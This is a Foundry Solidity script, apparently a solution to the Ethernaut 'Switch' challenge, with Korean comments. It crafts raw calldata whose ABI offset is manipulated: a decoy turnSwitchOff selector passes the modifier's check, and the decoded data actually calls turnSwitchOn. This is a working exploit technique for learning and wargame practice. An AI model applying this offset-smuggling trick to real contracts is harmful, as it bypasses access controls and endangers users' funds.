// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Switch} from "../src/Switch.sol";

contract SwitchScript is Script {

    address constant private SWITCH = 0x9999714C5c95Dd569f366319E16CD50Eae9fC803;

    function run() public {
        vm.startBroadcast();

        bytes4 offSelector  = bytes4(keccak256("turnSwitchOff()"));

        (bool ok, ) = SWITCH.call(
            abi.encodePacked(
                Switch.flipSwitch.selector,                  // [0..3]   flipSwitch(bytes) 셀렉터(4B)
                abi.encode(96),                              // [4..35]  _data offset = 96(0x60) (32B)
                abi.encode(0x00),                            // [36..67] 더미 32B (패딩, 디코더는 안봄)
                abi.encode(offSelector),                     // [68..99] 32B: 앞 4B에 offSelector → onlyOff 검사용 미끼 OK
                abi.encode(4),                               // [100..131] _data length = 4 (bytes 규칙)
                abi.encodeWithSelector(Switch.turnSwitchOn.selector) // [132..135] _data 실제 값(4B)
            )
        );
        require(ok);

        vm.stopBroadcast();
    }
}
